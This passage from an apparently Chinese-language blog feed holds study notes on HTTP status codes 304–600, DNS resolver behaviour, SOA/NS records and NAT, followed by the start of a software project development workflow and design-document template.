<li>Expires, Cache-Control，和&#x2F;或Vary，假如其值可能与之前相同变量的其他响应对应的值不同的话。<br>假如本响应请求使用了强缓存验证，那么本次响应不应该包含其他实体头；否则（例如，某个带条件的 GET 请求使用了弱缓存验证），本次响应禁止包含其他实体头；这避免了缓存了的实体内容和更新了的实体头信息之间的不一致。</li>
</ul>
<p>假如某个304响应指明了当前某个实体没有缓存，那么缓存系统必须忽视这个响应，并且重复发送不包含限制条件的请求。</p>
<p>假如接收到一个要求更新某个缓存条目的304响应，那么缓存系统必须更新整个条目以反映所有在响应中被更新的字段的值。</p>
<h5 id="305-Use-Proxy"><a href="#305-Use-Proxy" class="headerlink" title="305 Use Proxy"></a>305 Use Proxy</h5><p>被请求的资源必须通过指定的代理才能被访问。Location 域中将给出指定的代理所在的 URI 信息，接收者需要重复发送一个单独的请求，通过这个代理才能访问相应资源。只有原始服务器才能建立305响应。</p>
<p>注意：RFC 2068中没有明确305响应是为了重定向一个单独的请求，而且只能被原始服务器建立。忽视这些限制可能导致严重的安全后果。</p>
<h5 id="306-Switch-Proxy"><a href="#306-Switch-Proxy" class="headerlink" title="306 Switch Proxy"></a>306 Switch Proxy</h5><p>在最新版的规范中，306状态码已经不再被使用。</p>
<h5 id="307-Temporary-Redirect"><a href="#307-Temporary-Redirect" class="headerlink" title="307 Temporary Redirect"></a>307 Temporary Redirect</h5><p>请求的资源临时从不同的URI 响应请求。</p>
<p>新的临时性的URI 应当在响应的 Location 域中返回。除非这是一个HEAD 请求，否则响应的实体中应当包含指向新的URI 的超链接及简短说明。因为部分浏览器不能识别307响应，因此需要添加上述必要信息以便用户能够理解并向新的 URI 发出访问请求。</p>
<p>如果这不是一个GET 或者 HEAD 请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。</p>
<h4 id="4xx-请求错误"><a href="#4xx-请求错误" class="headerlink" title="4xx 请求错误"></a>4xx 请求错误</h4><p>这类的状态码代表了客户端看起来可能发生了错误，妨碍了服务器的处理。除非响应的是一个 HEAD 请求，否则服务器就应该返回一个解释当前错误状况的实体，以及这是临时的还是永久性的状况。这些状态码适用于任何请求方法。浏览器应当向用户显示任何包含在此类错误响应中的实体内容。</p>
<p>如果错误发生时客户端正在传送数据，那么使用TCP的服务器实现应当仔细确保在关闭客户端与服务器之间的连接之前，客户端已经收到了包含错误信息的数据包。如果客户端在收到错误信息后继续向服务器发送数据，服务器的TCP栈将向客户端发送一个重置数据包，以清除该客户端所有还未识别的输入缓冲，以免这些数据被服务器上的应用程序读取并干扰后者。</p>
<h5 id="400-Bad-Request"><a href="#400-Bad-Request" class="headerlink" title="400 Bad Request"></a>400 Bad Request</h5><ol>
<li>语义有误，当前请求无法被服务器理解。除非进行修改，否则客户端不应该重复提交这个请求。</li>
<li>请求参数有误。</li>
</ol>
<h5 id="401-Unauthorized"><a href="#401-Unauthorized" class="headerlink" title="401 Unauthorized"></a>401 Unauthorized</h5><p>当前请求需要用户验证。该响应必须包含一个适用于被请求资源的 WWW-Authenticate 信息头用以询问用户信息。客户端可以重复提交一个包含恰当的 Authorization 头信息的请求。如果当前请求已经包含了 Authorization 证书，那么401响应代表着服务器验证已经拒绝了那些证书。如果401响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。参见RFC 2617。</p>
<h5 id="402-Payment-Required"><a href="#402-Payment-Required" class="headerlink" title="402 Payment Required"></a>402 Payment Required</h5><p>该状态码是为了将来可能的需求而预留的。</p>
<h5 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h5><p>服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个 HEAD 请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个404响应，假如它不希望让客户端获得任何信息。</p>
<h5 id="404-Not-Found"><a href="#404-Not-Found" class="headerlink" title="404 Not Found"></a>404 Not Found</h5><p>请求失败，请求所希望得到的资源未被在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。出现这个错误的最有可能的原因是服务器端没有这个页面。</p>
<h5 id="405-Method-Not-Allowed"><a href="#405-Method-Not-Allowed" class="headerlink" title="405 Method Not Allowed"></a>405 Method Not Allowed</h5><p>请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个Allow 头信息用以表示出当前资源能够接受的请求方法的列表。</p>
<p>鉴于 PUT，DELETE 方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或者在默认配置下不允许上述请求方法，对于此类请求均会返回405错误。</p>
<h5 id="406-Not-Acceptable"><a href="#406-Not-Acceptable" class="headerlink" title="406 Not Acceptable"></a>406 Not Acceptable</h5><p>请求的资源的内容特性无法满足请求头中的条件，因而无法生成响应实体。</p>
<p>除非这是一个 HEAD 请求，否则该响应就应当返回一个包含可以让用户或者浏览器从中选择最合适的实体特性以及地址列表的实体。实体的格式由 Content-Type 头中定义的媒体类型决定。浏览器可以根据格式及自身能力自行作出最佳选择。但是，规范中并没有定义任何作出此类自动选择的标准。</p>
<h5 id="407-Proxy-Authentication-Required"><a href="#407-Proxy-Authentication-Required" class="headerlink" title="407 Proxy Authentication Required"></a>407 Proxy Authentication Required</h5><p>与401响应类似，只不过客户端必须在代理服务器上进行身份验证。代理服务器必须返回一个 Proxy-Authenticate 用以进行身份询问。客户端可以返回一个 Proxy-Authorization 信息头用以验证。参见RFC 2617。</p>
<h5 id="408-Request-Timeout"><a href="#408-Request-Timeout" class="headerlink" title="408 Request Timeout"></a>408 Request Timeout</h5><p>请求超时。客户端没有在服务器预备等待的时间内完成一个请求的发送。客户端可以随时再次提交这一请求而无需进行任何更改。</p>
<h5 id="409-Conflict"><a href="#409-Conflict" class="headerlink" title="409 Conflict"></a>409 Conflict</h5><p>由于和被请求的资源的当前状态之间存在冲突，请求无法完成。这个代码只允许用在这样的情况下才能被使用：用户被认为能够解决冲突，并且会重新提交新的请求。该响应应当包含足够的信息以便用户发现冲突的源头。</p>
<p>冲突通常发生于对 PUT 请求的处理中。例如，在采用版本检查的环境下，某次 PUT 提交的对特定资源的修改请求所附带的版本信息与之前的某个（第三方）请求向冲突，那么此时服务器就应该返回一个409错误，告知用户请求无法完成。此时，响应实体中很可能会包含两个冲突版本之间的差异比较，以便用户重新提交归并以后的新版本。</p>
<h5 id="410-Gone"><a href="#410-Gone" class="headerlink" title="410 Gone"></a>410 Gone</h5><p>被请求的资源在服务器上已经不再可用，而且没有任何已知的转发地址。这样的状况应当被认为是永久性的。如果可能，拥有链接编辑功能的客户端应当在获得用户许可后删除所有指向这个地址的引用。如果服务器不知道或者无法确定这个状况是否是永久的，那么就应该使用404状态码。除非额外说明，否则这个响应是可缓存的。</p>
<p>410响应的目的主要是帮助网站管理员维护网站，通知用户该资源已经不再可用，并且服务器拥有者希望所有指向这个资源的远端连接也被删除。这类事件在限时、增值服务中很普遍。同样，410响应也被用于通知客户端在当前服务器站点上，原本属于某个个人的资源已经不再可用。当然，是否需要把所有永久不可用的资源标记为’410 Gone’，以及是否需要保持此标记多长时间，完全取决于服务器拥有者。</p>
<h5 id="411-Length-Required"><a href="#411-Length-Required" class="headerlink" title="411 Length Required"></a>411 Length Required</h5><p>服务器拒绝在没有定义 Content-Length 头的情况下接受请求。在添加了表明请求消息体长度的有效 Content-Length 头之后，客户端可以再次提交该请求。</p>
<h5 id="412-Precondition-Failed"><a href="#412-Precondition-Failed" class="headerlink" title="412 Precondition Failed"></a>412 Precondition Failed</h5><p>服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。这个状态码允许客户端在获取资源时在请求的元信息（请求头字段数据）中设置先决条件，以此避免该请求方法被应用到其希望的内容以外的资源上。</p>
<h5 id="413-Request-Entity-Too-Large"><a href="#413-Request-Entity-Too-Large" class="headerlink" title="413 Request Entity Too Large"></a>413 Request Entity Too Large</h5><p>服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。此种情况下，服务器可以关闭连接以免客户端继续发送此请求。</p>
<p>如果这个状况是临时的，服务器应当返回一个 Retry-After 的响应头，以告知客户端可以在多少时间以后重新尝试。</p>
<h5 id="414-Request-URI-Too-Long"><a href="#414-Request-URI-Too-Long" class="headerlink" title="414 Request-URI Too Long"></a>414 Request-URI Too Long</h5><p>请求的URI 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。这比较少见，通常的情况包括：</p>
<p>本应使用POST方法的表单提交变成了GET方法，导致查询字符串（Query String）过长。</p>
<p>重定向URI “黑洞”，例如每次重定向把旧的 URI 作为新的 URI 的一部分，导致在若干次重定向后 URI 超长。</p>
<p>客户端正在尝试利用某些服务器中存在的安全漏洞攻击服务器。这类服务器使用固定长度的缓冲读取或操作请求的 URI，当 GET 后的参数超过某个数值后，可能会产生缓冲区溢出，导致任意代码被执行[1]。没有此类漏洞的服务器，应当返回414状态码。</p>
<h5 id="415-Unsupported-Media-Type"><a href="#415-Unsupported-Media-Type" class="headerlink" title="415 Unsupported Media Type"></a>415 Unsupported Media Type</h5><p>对于当前请求的方法和所请求的资源，请求中提交的实体并不是服务器中所支持的格式，因此请求被拒绝。</p>
<h5 id="416-Requested-Range-Not-Satisfiable"><a href="#416-Requested-Range-Not-Satisfiable" class="headerlink" title="416 Requested Range Not Satisfiable"></a>416 Requested Range Not Satisfiable</h5><p>如果请求中包含了 Range 请求头，并且 Range 中指定的任何数据范围都与当前资源的可用范围不重合，同时请求中又没有定义 If-Range 请求头，那么服务器就应当返回416状态码。</p>
<p>假如 Range 使用的是字节范围，那么这种情况就是指请求指定的所有数据范围的首字节位置都超过了当前资源的长度。服务器也应当在返回416状态码的同时，包含一个 Content-Range 实体头，用以指明当前资源的长度。这个响应也被禁止使用 multipart&#x2F;byteranges 作为其 Content-Type。</p>
<h5 id="417-Expectation-Failed"><a href="#417-Expectation-Failed" class="headerlink" title="417 Expectation Failed"></a>417 Expectation Failed</h5><p>在请求头 Expect 中指定的预期内容无法被服务器满足，或者这个服务器是一个代理服务器，它有明显的证据证明在当前路由的下一个节点上，Expect 的内容无法被满足。</p>
<h5 id="418-I’m-a-teapot"><a href="#418-I’m-a-teapot" class="headerlink" title="418 I’m a teapot"></a>418 I’m a teapot</h5><h5 id="421-too-many-connections"><a href="#421-too-many-connections" class="headerlink" title="421 too many connections"></a>421 too many connections</h5><p>There are too many connections from your internet address</p>
<p>从当前客户端所在的IP地址到服务器的连接数超过了服务器许可的最大范围。通常，这里的IP地址指的是从服务器上看到的客户端地址（比如用户的网关或者代理服务器地址）。在这种情况下，连接数的计算可能涉及到不止一个终端用户。</p>
<h5 id="422-Unprocessable-Entity"><a href="#422-Unprocessable-Entity" class="headerlink" title="422 Unprocessable Entity"></a>422 Unprocessable Entity</h5><p>请求格式正确，但是由于含有语义错误，无法响应。（RFC 4918 WebDAV）</p>
<h5 id="423-Locked"><a href="#423-Locked" class="headerlink" title="423 Locked"></a>423 Locked</h5><p>当前资源被锁定。（RFC 4918 WebDAV）</p>
<h5 id="424-Failed-Dependency"><a href="#424-Failed-Dependency" class="headerlink" title="424 Failed Dependency"></a>424 Failed Dependency</h5><p>由于之前的某个请求发生的错误，导致当前请求失败，例如 PROPPATCH。（RFC 4918 WebDAV）</p>
<h5 id="425-Unordered-Collection"><a href="#425-Unordered-Collection" class="headerlink" title="425 Unordered Collection"></a>425 Unordered Collection</h5><p>在WebDav Advanced Collections 草案中定义，但是未出现在《WebDAV 顺序集协议》（RFC 3658）中。</p>
<h5 id="426-Upgrade-Required"><a href="#426-Upgrade-Required" class="headerlink" title="426 Upgrade Required"></a>426 Upgrade Required</h5><p>客户端应当切换到TLS&#x2F;1.0。（RFC 2817）</p>
<h5 id="449-Retry-With"><a href="#449-Retry-With" class="headerlink" title="449 Retry With"></a>449 Retry With</h5><p>由微软扩展，代表请求应当在执行完适当的操作后进行重试。</p>
<h5 id="451-Unavailable-For-Legal-Reasons"><a href="#451-Unavailable-For-Legal-Reasons" class="headerlink" title="451 Unavailable For Legal Reasons"></a>451 Unavailable For Legal Reasons</h5><p>该请求因法律原因不可用。（RFC 7725）</p>
<h4 id="5xx、6xx-服务器错误"><a href="#5xx、6xx-服务器错误" class="headerlink" title="5xx、6xx 服务器错误"></a>5xx、6xx 服务器错误</h4><p>这类状态码代表了服务器在处理请求的过程中有错误或者异常状态发生，也有可能是服务器意识到以当前的软硬件资源无法完成对请求的处理。除非这是一个HEAD 请求，否则服务器应当包含一个解释当前错误状态以及这个状况是临时的还是永久的解释信息实体。浏览器应当向用户展示任何在当前响应中被包含的实体。</p>
<p>这些状态码适用于任何响应方法。</p>
<h5 id="500-Internal-Server-Error"><a href="#500-Internal-Server-Error" class="headerlink" title="500 Internal Server Error"></a>500 Internal Server Error</h5><p>服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。一般来说，这个问题都会在服务器端的源代码出现错误时出现。</p>
<h5 id="501-Not-Implemented"><a href="#501-Not-Implemented" class="headerlink" title="501 Not Implemented"></a>501 Not Implemented</h5><p>服务器不支持当前请求所需要的某个功能。当服务器无法识别请求的方法，并且无法支持其对任何资源的请求。</p>
<h5 id="502-Bad-Gateway"><a href="#502-Bad-Gateway" class="headerlink" title="502 Bad Gateway"></a>502 Bad Gateway</h5><p>作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。</p>
<h5 id="503-Service-Unavailable"><a href="#503-Service-Unavailable" class="headerlink" title="503 Service Unavailable"></a>503 Service Unavailable</h5><p>由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是临时的，并且将在一段时间以后恢复。如果能够预计延迟时间，那么响应中可以包含一个 Retry-After 头用以标明这个延迟时间。如果没有给出这个 Retry-After 信息，那么客户端应当以处理500响应的方式处理它。</p>
<p>注意：503状态码的存在并不意味着服务器在过载的时候必须使用它。某些服务器只不过是希望拒绝客户端的连接。</p>
<h5 id="504-Gateway-Timeout"><a href="#504-Gateway-Timeout" class="headerlink" title="504 Gateway Timeout"></a>504 Gateway Timeout</h5><p>作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器（URI标识出的服务器，例如HTTP、FTP、LDAP）或者辅助服务器（例如DNS）收到响应。<br>注意：某些代理服务器在DNS查询超时时会返回400或者500错误</p>
<h5 id="505-HTTP-Version-Not-Supported"><a href="#505-HTTP-Version-Not-Supported" class="headerlink" title="505 HTTP Version Not Supported"></a>505 HTTP Version Not Supported</h5><p>服务器不支持，或者拒绝支持在请求中使用的 HTTP 版本。这暗示着服务器不能或不愿使用与客户端相同的版本。响应中应当包含一个描述了为何版本不被支持以及服务器支持哪些协议的实体。</p>
<h5 id="506-Variant-Also-Negotiates"><a href="#506-Variant-Also-Negotiates" class="headerlink" title="506 Variant Also Negotiates"></a>506 Variant Also Negotiates</h5><p>由《透明内容协商协议》（RFC 2295）扩展，代表服务器存在内部配置错误：被请求的协商变元资源被配置为在透明内容协商中使用自己，因此在一个协商处理中不是一个合适的重点。</p>
<h5 id="507-Insufficient-Storage"><a href="#507-Insufficient-Storage" class="headerlink" title="507 Insufficient Storage"></a>507 Insufficient Storage</h5><p>服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。WebDAV (RFC 4918)</p>
<h5 id="509-Bandwidth-Limit-Exceeded"><a href="#509-Bandwidth-Limit-Exceeded" class="headerlink" title="509 Bandwidth Limit Exceeded"></a>509 Bandwidth Limit Exceeded</h5><p>服务器达到带宽限制。这不是一个官方的状态码，但是仍被广泛使用。</p>
<h5 id="510-Not-Extended"><a href="#510-Not-Extended" class="headerlink" title="510 Not Extended"></a>510 Not Extended</h5><p>获取资源所需要的策略并没有被满足。（RFC 2774）</p>
<h5 id="600-Unparseable-Response-Headers"><a href="#600-Unparseable-Response-Headers" class="headerlink" title="600 Unparseable Response Headers"></a>600 Unparseable Response Headers</h5><p>源站没有返回响应头部，只返回实体内容。</p>
<h2 id="3-DNS"><a href="#3-DNS" class="headerlink" title="3. DNS"></a>3. DNS</h2><h3 id="3-1-不同系统处理dns响应和首选备选的区别"><a href="#3-1-不同系统处理dns响应和首选备选的区别" class="headerlink" title="3.1. 不同系统处理dns响应和首选备选的区别"></a>3.1. 不同系统处理dns响应和首选备选的区别</h3><h4 id="dns响应的理解"><a href="#dns响应的理解" class="headerlink" title="dns响应的理解"></a>dns响应的理解</h4><ul>
<li>空结果代表存在此dns的SOA记录，但是此域名没有请求的类型，系统会认为此域名没有这个类型，不会使用备选dns</li>
<li>no such name代表dns上不存在此域名的记录，系统会认为此域名没有配置，不会使用备选dns</li>
<li>server failure代表dns服务器出错，会立即使用备选dns</li>
</ul>
<h4 id="1-linux"><a href="#1-linux" class="headerlink" title="1) linux"></a>1) linux</h4><ul>
<li>ping会同时请求A记录和AAAA记录</li>
<li>nslookup会先A记录再AAAA记录，如果A不通不会请求AAAA</li>
<li>浏览器请求了A记录，根据当前网卡来</li>
<li>本地没有dns时，请求127地址</li>
<li>首选不通，超时5s请求备选</li>
</ul>
<h4 id="2-windows"><a href="#2-windows" class="headerlink" title="2) windows"></a>2) windows</h4><ul>
<li>基本同上，但是超时时间为1s</li>
</ul>
<h3 id="3-2-tcp和udp"><a href="#3-2-tcp和udp" class="headerlink" title="3.2. tcp和udp"></a>3.2. tcp和udp</h3><ul>
<li>tcpdns和udpdns相比在前两个字节多了一个长度（单位字节，不带长度所占的两个字节的大小），也就是dns请求和响应包最大不超过65535</li>
<li>udp的dns如果超过512字节，就会使用tcp传输</li>
</ul>
<h3 id="3-3-SOA和NS"><a href="#3-3-SOA和NS" class="headerlink" title="3.3. SOA和NS"></a>3.3. SOA和NS</h3><p>参考 <a href="https://www.cnblogs.com/bighammerdata/p/12776830.html">SOA记录和NS记录的通俗解释</a></p>
<p>DNS服务器里有两个比较重要的记录。一个叫SOA记录（起始授权机构） 一个叫NS（Name Server）记录（域名服务器）关于这两个记录，很多文章都有解释，但是很多人还是很糊涂。我现在通俗的解释一下这两个记录是干什么的。如果理解有错误，欢迎高手来指正。<br>SOA记录表明了DNS服务器之间的关系。SOA记录表明了谁是这个区域的所有者。比如51CTO.COM这个区域。一个DNS服务器安装后，需要创建一个区域，以后这个区域的查询解析，都是通过DNS服务器来完成的。现在来说一下所有者，我这里所说的所有者，就是谁对这个区域有修改权利。常见的DNS服务器只能创建一个标准区域，然后可以创建很多个辅助区域。标准区域是可以读写修改的。而辅助区域只能通过标准区域复制来完成，不能在辅助区域中进行修改。而创建标准区域的DNS就会有SOA记录，或者准确说SOA记录中的主机地址一定是这个标准区域的服务器IP地址。</p>
<p>如果是两台集成了DNS的DC，实际上由于要求DNS区域可写，所以打破了单纯DNS服务器只能有一个标准区域的限制。所以两台DC都有SOA记录指向自己。</p>
<p>NS记录实际上也是在DNS服务器之间，表明谁对某个区域有解释权，即权威DNS。大家都知道电信和网通都有很多的DNS服务器。这些服务器为我们上公网做域名解析提供了很多方便。但是这些DNS服务器有一个有意思的地方是这些DNS不存放任何区域，看上去更像是一个DNS CLIENT，它们被称为唯缓存DNS服务器。它们会缓存大量的解析地址，这样就会让你解析的时候选择它们会觉得很快。它们在查询的时候就会查询NS记录，通过这个记录就知道谁在负责比如51CTO.COM这个地域的管理工作。还有一种情况来说明NS记录的作用。比如你先在万网申请了一个域名ABC.COM。一般情况是万网的域名服务器替你来解析如WWW.ABC.COM这样的主机记录。如果你想自己架设一个DNS服务器，让这台服务器从今往后替代万网的DNS服务器解析，那么你就需要在你的DNS上设置NS记录，然后将万网域名管理系统中的NS记录改成你的DNSIP。这样以后就是你自己的DNS服务器负责提供解析了。即使万网的DNS服务器出现故障，别人仍然可以找到你。</p>
<p>另外值得一说的是，相对你DNS的CLIENT，你设置的DNS服务器地址就是你的权威DNS。通过NSLOOKUP工具可以看到。而那个非权威应答，恰恰是那个区域真正的NS。</p>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h2 id="1-局域网和外网？"><a href="#1-局域网和外网？" class="headerlink" title="1. 局域网和外网？"></a>1. 局域网和外网？</h2><h3 id="一个局域网内共用一个外网ip，数据如何定位到自己的电脑上的？"><a href="#一个局域网内共用一个外网ip，数据如何定位到自己的电脑上的？" class="headerlink" title="一个局域网内共用一个外网ip，数据如何定位到自己的电脑上的？"></a>一个局域网内共用一个外网ip，数据如何定位到自己的电脑上的？</h3><ul>
<li>通过端口定位</li>
<li>电脑通过路由器连接到外网时，会在路由器上映射一个nat表，nat运行在传输层，因为要解析端口</li>
<li>表中映射为<code>ip:port</code>，会将路由器上随机生成一个端口，并且将局域网ip加端口和外网ip加端口相互映射。</li>
<li>本地电脑通过这个映射表连上外网</li>
</ul>
<p>如:</p>
<ul>
<li>路由器外网ip: 115.156.207.252</li>
<li>电脑的局域网ip: 192.168.11.109</li>
</ul>
<p>电脑连外网时，通过本机的<code>80</code>端口访问网页。路由器会随机生成一个端口号，比如<code>1234</code>。路由器的nat映射表就会有一条记录：<code>115.156.207.252:1234 &lt;-&gt; 192.168.11.109:80</code>，外网的数据就通过返回到<code>115.156.207.252:1234</code>这个地址来给到电脑的<code>80</code>端口上。</p>
<h2 id="1-tun网卡和tap网卡区别"><a href="#1-tun网卡和tap网卡区别" class="headerlink" title="1. tun网卡和tap网卡区别"></a>1. tun网卡和tap网卡区别</h2><ul>
<li>tun网卡工作在第三层网络层，没有mac地址，不能跟物理网卡做桥转发</li>
<li>tap网卡工作在第二层数据链路层，有mac地址，可以跟物理网卡做桥转发</li>
</ul>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>项目开发经验</title>
    <url>/blogs/2018-07-02-project-develop/</url>
    <content><![CDATA[<h1 id="一、开发"><a href="#一、开发" class="headerlink" title="一、开发"></a>一、开发</h1><h2 id="1-工具"><a href="#1-工具" class="headerlink" title="1. 工具"></a>1. 工具</h2><ul>
<li>设计画图（流程图、类图、时序图等）: <a href="/blogs/2020-04-22-plantuml">plantuml</a></li>
<li>框架画图: drawio（vscode安装插件可直接画图）</li>
<li>接口文档和项目文档: showdoc（支持docker搭建，并支持plantuml）</li>
<li>场景梳理: <code>xmind</code></li>
<li>接口管理器: yapi</li>
</ul>
<h2 id="2-开发流程"><a href="#2-开发流程" class="headerlink" title="2. 开发流程"></a>2. 开发流程</h2><ol>
<li>需求定义</li>
</ol>
<ul>
<li>用户需求，由PO和开发一起给出，主要由用户故事组成，每个用户故事工作量控制在3-5d</li>
<li>系统需求，由开发根据用户需求进行输出，将每个用户故事提出方案和各种考虑，输出场景等</li>
</ul>
<ol start="2">
<li>需求讲解、反述</li>
<li>场景梳理和工作量评估</li>
</ol>
<ul>
<li>正常场景和异常场景梳理</li>
<li>需求对齐，检视工作量是否可达</li>
</ul>
<ol start="4">
<li>设计</li>
</ol>
<ul>
<li>安全编码设计</li>
<li>评审、修改</li>
</ul>
<ol start="5">
<li>测试用例评审</li>
<li>编码</li>
<li>联调和自测</li>
</ol>
<ul>
<li>测试覆盖的场景记录</li>
</ul>
<ol start="8">
<li>缺陷预防</li>
</ol>
<ul>
<li>代码走读</li>
<li>代码扫描和覆盖率测试</li>
<li>接口测试（自动化或配合接口平台测试）</li>
<li>需求检视</li>
<li>checklist（编码+安全）</li>
<li>BVT测试（配合测试达到自动化）<ul>
<li>联调和覆盖测试过得可以不测</li>
</ul>
</li>
</ul>
<ol start="9">
<li>转测试</li>
<li>问题修改</li>
</ol>
<h2 id="3-工作量梳理"><a href="#3-工作量梳理" class="headerlink" title="3. 工作量梳理"></a>3. 工作量梳理</h2><ul>
<li>按照开发流程每一步进行细化梳理</li>
<li>先根据交互设计图梳理出要做的需求点，不能有遗漏，漏掉的就是加班</li>
</ul>
<h2 id="4-设计"><a href="#4-设计" class="headerlink" title="4. 设计"></a>4. 设计</h2><h3 id="4-1-设计思想"><a href="#4-1-设计思想" class="headerlink" title="4.1. 设计思想"></a>4.1. 设计思想</h3><ol>
<li>当前需求可能不考虑某些场景，比如多xxx，但是设计上需要考虑，防止以后需求变化需要重构代码</li>
<li>基于未来去设计，基于现在来开发</li>
<li><a href="/blogs/2018-10-09-objectOrientedStudy">设计模式</a></li>
<li>设计流程: 职责-&gt;接口-&gt;实现-&gt;场景</li>
<li>生产者消费者关系明确，观察者角色明确</li>
<li>模块解耦，不要依赖外部某个模块的实现，可以通过定义<strong>添加&#x2F;移除 观察者函数</strong>来实现不依赖外部</li>
<li>接口限制越死，外部依赖越小</li>
<li>类的区分考虑分层和职责，不能单纯只想模块</li>
<li>将业务分离，通用模块尽量少业务代码，抽象成通用逻辑</li>
<li>不要太过深入技术考虑，特殊场景考虑从用户使用角度分离，如果是此用户使用场景很小，可以进行规避不处理</li>
<li>考虑场景要从业务角度进行考虑，定义好使用场景再从技术角度分析是否可行</li>
</ol>
<p><strong>防遗漏checklist</strong></p>
<ol>
<li>对外接口线程安全</li>
<li>状态维护由谁来做</li>
<li>集群分布式状态问题</li>
<li>升级场景是否配置变化需要转换</li>
<li>改动后，如何排查</li>
<li>改动后，是否增加维护成本</li>
<li>能不使用缓存就不使用</li>
<li>使用缓存的生命周期需要明确写出</li>
<li>宏观上考虑一下，设计是否合理，不要总是深入思考</li>
<li>客户端考虑跨平台兼容性</li>
</ol>
<h3 id="4-2-模板"><a href="#4-2-模板" class="headerlink" title="4.2. 模板"></a>4.2. 模板</h3><h4 id="1-中型需求模板（开发周期2周）"><a href="#1-中型需求模板（开发周期2周）" class="headerlink" title="1) 中型需求模板（开发周期2周）"></a>1) 中型需求模板（开发周期2周）</h4><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section"># 一、介绍</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 1. 目的</span></span><br><span class="line"></span><br><span class="line">简要介绍为什么会有本模块，本模块承担什么职责，为什么本模块要做这些事情。</span><br><span class="line"></span><br><span class="line"><span class="section">## 2. 定义和缩写</span></span><br><span class="line"></span><br><span class="line">定义或解释本文档中使用的所有专用名词和缩略语。</span><br><span class="line"></span><br><span class="line"><span class="section">## 3. 参考和引用</span></span><br><span class="line"></span><br><span class="line">列出本文档编写过程中参考的其它文档或资料</span><br><span class="line"></span><br><span class="line"><span class="section"># 二、设计目标</span></span><br><span class="line"></span><br><span class="line">设计人员遵照目标书要求完成设计，需自行检查是否达到目标书的要求。本设计文档要求后续设计方案能覆盖目标书中存在风险的设计点，以及与其它模块存在协作的设计点，其它无要求。</span><br><span class="line"></span><br><span class="line"><span class="section">## 1. 需求</span></span><br><span class="line"></span><br><span class="line">本章节描述用户层级对本模块提出的设计要求。</span><br><span class="line">从版本需求中提炼需要本模块实现的需求点。不应直接复制需求说明书中的描述，而应当进行抽象、提炼，转换为设计者角度进行描述的需求点。</span><br><span class="line"></span><br><span class="line"><span class="section">## 2. 约束</span></span><br><span class="line"></span><br><span class="line">本章节描述系统/版本层级对本模块提出的设计要求。</span><br><span class="line">本设计目标在模块设计开始前由总体设计师下发给模块设计者，或者总体设计师与模块责任人沟通后由模块责任人撰写，总体设计师审核。责任追溯时，如果本章节有问题，则为总体设计师的责任。</span><br><span class="line"></span><br><span class="line"><span class="section">### 2.1. 模块间协作(含API)</span></span><br><span class="line"></span><br><span class="line">描述本模块与系统其它部分的交互、协作关系，描述本模块对外提供的支持和接口。</span><br><span class="line"></span><br><span class="line"><span class="section">### 2.2. 设计特性约束</span></span><br><span class="line"></span><br><span class="line">| 编号 | 目标项类型    | 要求                                                                                                                                                                                                                          |</span><br><span class="line">| ---- | ------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |</span><br><span class="line">| 1    | 性能          | 常见性能指标：并发用户数，并发连接数，PPS（每秒处理包个数），支持规则数，界面响应速度，新建连接速度等等。                                                                                                                     |</span><br><span class="line">| 2    | 资源开销      | 对所使用资源的一些约束。常见资源开销：内存占用，CPU占用，磁盘占用，IO占用等等                                                                                                                                                 |</span><br><span class="line">| 3    | 稳定性/可靠性 | 该功能是否需要长时间运行，会不会影响客户业务，应做什么样的机制保证（比如把某个功能点放到独立进程中进行，使用脚本实现某些功能等等）。需要重点考虑对哪些异常场景的支持（比如程序死锁，CPU100%，崩溃，数据处理过程出现错误等）。 |</span><br><span class="line">| 4    | 可调试/可测试 | 需支持哪些调试手段，需支持哪些测试手段                                                                                                                                                                                        |</span><br><span class="line">| 5    | 可维护性      | 对维护运营工作的支持                                                                                                                                                                                                          |</span><br><span class="line">| 6    | 兼容性        | 允许升级配置的版本，允许对接的版本                                                                                                                                                                                            |</span><br><span class="line">| 7    | 可扩展性      | 哪些功能或接口需要可扩展设计                                                                                                                                                                                                  |</span><br><span class="line">| 8    | 其它          |                                                                                                                                                                                                                               |</span><br><span class="line"></span><br><span class="line"><span class="section">## 3. 支持</span></span><br><span class="line"></span><br><span class="line">本章节描述模块本身对设计提出的要求。</span><br><span class="line">模块在后续开发中，为了提高效率，降低风险所需要的一些支持手段、规范和要求。这部分要求一般不会对系统其它部分产生影响，只会影响到这个模块自身。一般包括内部测试方面的机制，代码调试方面的机制，等等。</span><br><span class="line"></span><br><span class="line">| 编号 | 目标项类型 | 要求                                                   |</span><br><span class="line">| ---- | ---------- | ------------------------------------------------------ |</span><br><span class="line">| 1    | 测试机制   | 如果要很方便做单元测试或者测试执行，对设计有什么要求？ |</span><br><span 